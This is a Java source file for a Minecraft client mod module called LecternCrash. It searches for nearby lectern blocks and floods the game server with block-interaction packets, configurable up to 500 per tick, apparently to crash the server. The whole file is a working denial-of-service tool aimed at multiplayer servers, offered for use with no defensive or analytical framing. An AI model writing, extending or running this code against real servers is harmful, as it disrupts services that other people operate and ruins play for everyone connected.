package dev.mlml.korppu.module.modules;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.config.DoubleSetting;
import dev.mlml.korppu.module.Module;
import dev.mlml.korppu.module.StatusEntry;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.network.protocol.game.ServerboundUseItemOnPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.world.phys.Vec3;
import org.lwjgl.glfw.GLFW;

import java.util.List;

public class LecternCrash extends Module {
    private final DoubleSetting range = config.add(new DoubleSetting("Range", "Search range for lecterns", 6d, 1d, 24d, 0));
    private final DoubleSetting packetsPerTick = config.add(new DoubleSetting("Packets/Tick", "Interaction packets sent each tick", 30d, 1d, 500d, 0));

    private int sent;

    public LecternCrash() {
        super("LecternCrash", "Spams lectern interaction packets", GLFW.GLFW_KEY_UNKNOWN);
    }

    @Override
    public void onTick() {
        if (KorppuMod.mc.player == null || KorppuMod.mc.level == null || KorppuMod.mc.getConnection() == null) return;

        BlockPos target = findLectern();
        if (target == null) return;

        BlockHitResult bhr = new BlockHitResult(target.getCenter(), Direction.UP, target, false);
        int count = packetsPerTick.getValue().intValue();
        for (int i = 0; i < count; i++) {
            KorppuMod.mc.getConnection().send(new ServerboundUseItemOnPacket(InteractionHand.MAIN_HAND, bhr, i));
            sent++;
        }
    }

    private BlockPos findLectern() {
        int r = range.getValue().intValue();
        BlockPos origin = KorppuMod.mc.player.blockPosition();
        for (int x = -r; x <= r; x++) {
            for (int y = -r; y <= r; y++) {
                for (int z = -r; z <= r; z++) {
                    BlockPos pos = origin.offset(x, y, z);
                    if (origin.distSqr(pos) > range.getValue() * range.getValue()) continue;
                    if (KorppuMod.mc.level.getBlockState(pos).getBlock() == Blocks.LECTERN) {
                        return pos;
                    }
                }
            }
        }
        return null;
    }

    @Override
    public List<StatusEntry> getStatusEntries() {
        return List.of(
                StatusEntry.text("Sent", String.valueOf(sent)),
                StatusEntry.text("Per Tick", String.valueOf(packetsPerTick.getValue().intValue()))
        );
    }
}
